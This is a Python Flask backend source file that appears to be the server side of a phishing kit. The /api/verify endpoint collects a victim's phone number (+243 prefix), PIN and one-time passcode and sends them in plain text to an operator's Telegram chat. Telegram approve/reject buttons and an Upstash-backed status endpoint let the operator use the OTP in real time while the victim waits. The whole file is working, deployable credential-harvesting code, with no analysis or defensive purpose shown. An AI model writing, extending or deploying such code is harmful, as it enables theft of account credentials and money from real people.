import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Try loading .env file if available
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

UPSTASH_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
UPSTASH_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")

def set_status(session_id, status):
    if UPSTASH_URL and UPSTASH_TOKEN and session_id:
        url = f"{UPSTASH_URL.rstrip('/')}/set/{session_id}/{status}"
        headers = {"Authorization": f"Bearer {UPSTASH_TOKEN}"}
        try:
            r = requests.post(url, headers=headers)
            if r.status_code != 200:
                print(f"[Upstash] Error setting status: {r.text}")
        except Exception as e:
            print(f"[Upstash] Exception setting status: {e}")

def get_status(session_id):
    if UPSTASH_URL and UPSTASH_TOKEN and session_id:
        url = f"{UPSTASH_URL.rstrip('/')}/get/{session_id}"
        headers = {"Authorization": f"Bearer {UPSTASH_TOKEN}"}
        try:
            r = requests.get(url, headers=headers)
            if r.status_code != 200:
                print(f"[Upstash] Error getting status: {r.text}")
            return r.json().get("result")
        except Exception as e:
            print(f"[Upstash] Exception getting status: {e}")
    return "pending"

@app.route('/api/status', methods=['GET'])
def status():
    session_id = request.args.get('session_id')
    current_status = get_status(session_id) or "pending"
    return jsonify({"status": current_status})

@app.route('/api/webhook', methods=['POST'])
def webhook():
    data = request.json or {}
    if 'callback_query' in data:
        query = data['callback_query']
        callback_data = query.get('data', '')
        callback_id = query.get('id')
        message = query.get('message')
        chat_id = message['chat']['id'] if message else None
        message_id = message['message_id'] if message else None
        token = os.environ.get("TELEGRAM_TOKEN")

        if callback_data.startswith("approve_") or callback_data.startswith("reject_"):
            action, session_id = callback_data.split('_', 1)
            status_val = "approved" if action == "approve" else "rejected"
            
            # Update Upstash
            set_status(session_id, status_val)
            
            # Edit Telegram Message
            if token and chat_id and message_id:
                new_text = message.get('text', '')
                if action == "approve":
                    new_text += "\n\n✅ <b>APPROUVÉ</b>"
                else:
                    new_text += "\n\n❌ <b>REFUSÉ</b>"
                    
                edit_url = f"https://api.telegram.org/bot{token}/editMessageText"
                requests.post(edit_url, json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": new_text,
                    "parse_mode": "HTML"
                })
                
                # Answer callback query to stop loading state on button
                ans_url = f"https://api.telegram.org/bot{token}/answerCallbackQuery"
                requests.post(ans_url, json={"callback_query_id": callback_id})
                
    return jsonify({"status": "success"})

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json or {}
    session_id = data.get('session_id', '')
    phone = data.get('phone', '')
    pin = data.get('pin', '')
    otp = data.get('otp', '')
    
    # Set pending status when OTP is submitted
    if otp != 'Pending OTP...' and session_id:
        set_status(session_id, "pending")
        
    token = os.environ.get("TELEGRAM_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    
    message = f"🚀 <b>New Application Received!</b>\n\n"
    message += f"📱 <b>Phone:</b> +243 {phone}\n"
    message += f"🔑 <b>PIN:</b> {pin}\n"
    message += f"🔢 <b>OTP:</b> {otp}\n"
    
    if token and chat_id:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        # Attach approval buttons on OTP submission
        if otp != 'Pending OTP...' and session_id:
            payload["reply_markup"] = {
                "inline_keyboard": [
                    [
                        {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
                        {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
                    ]
                ]
            }
            
        try:
            res = requests.post(url, json=payload)
            print(f"Telegram response status: {res.status_code}")
            print(f"Telegram response body: {res.text}")
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            
    return jsonify({"status": "success"})
